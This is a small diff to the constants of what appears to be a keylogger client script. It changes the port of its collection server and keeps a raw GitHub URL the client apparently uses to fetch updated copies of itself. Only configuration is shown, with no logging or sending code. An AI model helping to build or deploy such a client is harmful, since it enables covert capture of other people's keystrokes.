@@ -5,7 +5,7 @@ import os
 import sys
 
 # Constants
-SERVER_URL = 'http://192.168.15.16:5000'  # Server IP
+SERVER_URL = 'http://192.168.15.16:6969'  # Server IP
 GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
 LOCAL_PATH = os.path.abspath(__file__)
 
